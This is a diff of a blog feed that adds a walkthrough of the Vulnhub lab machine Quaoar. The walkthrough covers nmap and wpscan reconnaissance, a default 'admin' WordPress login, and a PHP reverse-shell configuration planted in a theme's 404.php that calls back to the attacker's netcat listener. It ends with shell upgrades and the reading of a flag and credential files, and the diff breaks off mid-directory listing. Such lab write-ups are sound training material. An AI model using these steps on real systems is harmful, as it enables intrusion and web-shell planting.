@@ -1,4 +1,376 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-08-07T13:52:52+02:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - The Wall</title><link href="http://localhost:4000/vulnhub-the-wall/" rel="alternate" type="text/html" title="Vulnhub.com - The Wall" /><published>2017-08-07T10:00:00+02:00</published><updated>2017-08-07T10:00:00+02:00</updated><id>http://localhost:4000/vulnhub-the-wall</id><content type="html" xml:base="http://localhost:4000/vulnhub-the-wall/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-08-19T18:13:05+02:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Quaoar</title><link href="http://localhost:4000/vulnhub-quaoar/" rel="alternate" type="text/html" title="Vulnhub.com - Quaoar" /><published>2017-08-19T10:00:00+02:00</published><updated>2017-08-19T10:00:00+02:00</updated><id>http://localhost:4000/vulnhub-quaoar</id><content type="html" xml:base="http://localhost:4000/vulnhub-quaoar/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Hello everyone, another week, another challenge from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;. This time we're going to work on a short machine called &lt;b&gt;Quaoar&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Quaoar
+
+This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/
+
+Difficulty : Very Easy
+
+Tips:
+
+Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)
+
+Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box
+
+Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing
+
+SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753
+
+You may have issues with VMware&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/viper,475/&quot;&gt;&lt;b&gt;Viper&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&quot;&gt;&lt;b&gt;Quaoar&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1&gt;Write-Up&lt;/h1&gt;
+
+&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.103&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;Victim: &lt;b&gt;Quaoar 192.168.56.102&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;Let's start by firstly scanning the machine with &lt;b&gt;nmap&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -v -sS -A -T4 192.168.56.102
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-19 08:24 EDT
+NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 08:24
+Completed NSE at 08:24, 0.00s elapsed
+Initiating NSE at 08:24
+Completed NSE at 08:24, 0.00s elapsed
+Initiating ARP Ping Scan at 08:24
+Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 08:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Initiating SYN Stealth Scan at 08:24
+Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
+Discovered open port 80/tcp on 192.168.56.102
+Discovered open port 995/tcp on 192.168.56.102
+Discovered open port 110/tcp on 192.168.56.102
+Discovered open port 22/tcp on 192.168.56.102
+Discovered open port 993/tcp on 192.168.56.102
+Discovered open port 53/tcp on 192.168.56.102
+Discovered open port 139/tcp on 192.168.56.102
+Discovered open port 445/tcp on 192.168.56.102
+Discovered open port 143/tcp on 192.168.56.102
+Completed SYN Stealth Scan at 08:24, 1.43s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 08:24
+Scanning 9 services on 192.168.56.102
+Completed Service scan at 08:24, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.102&lt;/span&gt;
+adjust_timeouts2: packet supposedly had rtt of -176545 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -176545 microseconds.  Ignoring time.
+NSE: Script scanning 192.168.56.102.
+Initiating NSE at 08:24
+Completed NSE at 08:24, 9.19s elapsed
+Initiating NSE at 08:24
+Completed NSE at 08:24, 0.00s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00082s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 991 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+53/tcp  open  domain      ISC BIND 9.8.1-P1
+| dns-nsid:
+|_  bind.version: 9.8.1-P1
+80/tcp  open  http        Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+| http-robots.txt: 1 disallowed entry
+|_Hackers
+|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES STLS PIPELINING SASL TOP UIDL CAPA
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2016-10-07T04:32:43
+| Not valid after:  2026-10-07T04:32:43
+| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
+|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
+|_ssl-date: 2017-08-19T14:24:32+00:00; +2h00m00s from scanner time.
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: IDLE SASL-IR ENABLE more STARTTLS ID have capabilities LOGIN-REFERRALS post-login LOGINDISABLEDA0001 listed LITERAL+ OK IMAP4rev1 Pre-login
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2016-10-07T04:32:43
+| Not valid after:  2026-10-07T04:32:43
+| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
+|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
+|_ssl-date: 2017-08-19T14:24:31+00:00; +2h00m00s from scanner time.
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+993/tcp open  ssl/imap    Dovecot imapd
+|_imap-capabilities: IDLE SASL-IR AUTH=PLAINA0001 more ID have capabilities LOGIN-REFERRALS post-login listed LITERAL+ OK IMAP4rev1 ENABLE Pre-login
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2016-10-07T04:32:43
+| Not valid after:  2026-10-07T04:32:43
+| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
+|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
+|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
+995/tcp open  ssl/pop3    Dovecot pop3d
+|_pop3-capabilities: RESP-CODES PIPELINING USER SASL(PLAIN) TOP UIDL CAPA
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2016-10-07T04:32:43
+| Not valid after:  2026-10-07T04:32:43
+| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
+|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
+|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
+MAC Address: 08:00:27:BB:CE:22 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.5
+Uptime guess: 198.049 days (since Thu Feb  2 06:14:13 2017)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: QUAOAR, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| Names:
+|   QUAOAR&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   QUAOAR&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   QUAOAR&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   \x01\x02__MSBROWSE__\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|_  WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+| smb-os-discovery:
+|   OS: Unix (Samba 3.6.3)
+|   NetBIOS computer name:
+|   Workgroup: WORKGROUP
+|_  System time: 2017-08-19T10:24:30-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn'&lt;/span&gt;t support SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.82 ms 192.168.56.102
+
+NSE: Script Post-scanning.
+Initiating NSE at 08:24
+Completed NSE at 08:24, 0.00s elapsed
+Initiating NSE at 08:24
+Completed NSE at 08:24, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;25.33 seconds
+           Raw packets sent: 1127 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51.988KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;47.336KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Wow, that's a lot of open ports. I decided to begin from looking at the &lt;b&gt;port 80&lt;/b&gt;. In addition &lt;b&gt;nmap&lt;/b&gt; scan showed disallowed entry, which we have to check out. &lt;/p&gt;
+
+&lt;p&gt;Main directory of the web pages showes only two images. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/quaoar/htp1.png&quot; alt=&quot;Hack_The_Planet_1&quot; class=&quot;img-responsive center-block&quot; /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/img/quaoar/htp2.png&quot; alt=&quot;Hack_The_Planet_2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let's take a look at &lt;b&gt;robots.txt&lt;/b&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Disallow: Hackers
+Allow: /wordpress/
+   ____                              
+&lt;span class=&quot;c&quot;&gt;#  /___ \_   _  __ _  ___   __ _ _ __&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# //  / / | | |/ _` |/ _ \ / _` | '__|&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#/ \_/ /| |_| | (_| | (_) | (_| | |   &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#\___,_\ \__,_|\__,_|\___/ \__,_|_|   &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Wordpress directory? Seems interesting. By looking at the source code, we know that it's an old version of this CMS. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WordPress 3.9.14&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let's run a &lt;b&gt;wpscan&lt;/b&gt;, while in meantime I decided to look for common usernames on the &lt;b&gt;wp-login&lt;/b&gt; page. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;wpscan --url http://192.168.56.102/wordpress
+_______________________________________________________________
+        __          _______   _____                  
+        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
+         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
+          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _ | _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+           &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /  | |     ____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | | |
+            &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;   |_|    |_____/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://192.168.56.102/wordpress/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sat Aug 19 08:30:02 2017
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] The WordPress &lt;span class=&quot;s1&quot;&gt;'http://192.168.56.102/wordpress/readme.html'&lt;/span&gt; file exists exposing a version number
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 3.9.14 identified from meta generator
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyfourteen - v1.1
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyfourteen - v1.1
+ |  Location: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] The version is out of date, the latest version is 1.6
+ |  Style URL: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/style.css
+ |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
+ |  Theme Name: Twenty Fourteen
+ |  Theme URI: http://wordpress.org/themes/twentyfourteen
+ |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
+ |  Author: the WordPress team
+ |  Author URI: http://wordpress.org/
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sat Aug 19 08:30:05 2017
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 41
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 8.387 MB
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:03&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But wait, there's an &lt;b&gt;admin&lt;/b&gt; account? &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-admin.png&quot; alt=&quot;Admin login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And there's even more, username of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;
+
+&lt;p&gt;Reemeber to change the IP address. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;$VERSION = &quot;1.0&quot;;
+$ip = '192.168.56.103';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;To put it in the site, I decided to modify the code of &lt;b&gt;404.php&lt;/b&gt; page from the theme. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-shell.png&quot; alt=&quot;Shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we only have to set up the listener and navigate to the url of the page. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;192.168.56.102/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc -lvp 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
+192.168.56.102: inverse host lookup failed: Unknown host
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 51795
+Linux Quaoar 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;
+ 11:00:33 up 40 min,  0 users,  load average: 0.01, 0.05, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let's look for flags! I've found the first one in &lt;b&gt;/home&lt;/b&gt; directory. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Oct 24  2016 .
+drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
+drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wpadmin
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ls -la
+total 12
+drwxr-xr-x 2 root    root    4096 Oct 22  2016 .
+drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
+-rw-r--r-- 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat flag.txt
+2bafe61f03117ac66a73c3c514de796e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, it's time to escalate our privilages. And to my amusement, in &lt;b&gt;wp-config.php&lt;/b&gt; there was root password for &lt;b&gt;mysql&lt;/b&gt; database. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;www-data@Quaoar:/$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;var/www
+&lt;span class=&quot;gp&quot;&gt;www-data@Quaoar:/var/www$ &lt;/span&gt;ls -la
+ls -la
+total 3628
+drwxr-xr-x  6 www-data www-data   4096 Oct 24  2016 .
+drwxr-xr-x 13 root     root       4096 Jan 15  2017 ..
+-rw-r--r--  1 www-data www-data    224 Oct 12  2016 CHANGELOG
+-rw-r--r--  1 www-data www-data  35147 Oct 12  2016 COPYING
+-rw-r--r--  1 www-data www-data 652654 Oct 23  2016 Hack_The_Planet.jpg
+-rw-r--r--  1 www-data www-data 281003 Oct 23  2016 Hack_The_Planet2.jpg
+-rw-r--r--  1 www-data www-data 126042 Oct 23  2016 Hack_The_Planet3.jpg
+-rw-r--r--  1 www-data www-data   1241 Oct 12  2016 INSTALL
+-rw-r--r--  1 www-data www-data   1672 Oct 12  2016 LICENSE
+-rw-r--r--  1 www-data www-data 756701 Oct 23  2016 Quaoar.jpg
+-rw-r--r--  1 www-data www-data    954 Oct 12  2016 README.md
+-rw-r--r--  1 www-data www-data 169045 Oct 23  2016 hack-planet-1280-amox-zone.jpg
+-rw-r--r--  1 www-data www-data 261593 Oct 23  2016 hack-planet-high-definition-mobile.jpg
+-rw-r--r--  1 www-data www-data 179812 Oct 23  2016 hacker-manifesto-ethical.jpg
+-rw-r--r--  1 www-data www-data 616848 Oct 23  2016 hacking.jpg
+drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 hsperfdata_tomcat6
+-rw-r--r--  1 www-data www-data    100 Oct 24  2016 index.html
+-rw-r--r--  1 www-data www-data 573058 Oct 23  2016 pososibo-ethical-hacking-hack-fond.jpg
+-rw-r--r--  1 www-data www-data    271 Oct 24  2016 robots.txt
+drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 tomcat6-tomcat6-tmp
+drwxr-xr-x 13 www-data www-data   4096 Oct 12  2016 upload
+drwxr-xr-x  5 www-data www-data   4096 Nov 30  2016 wordpress
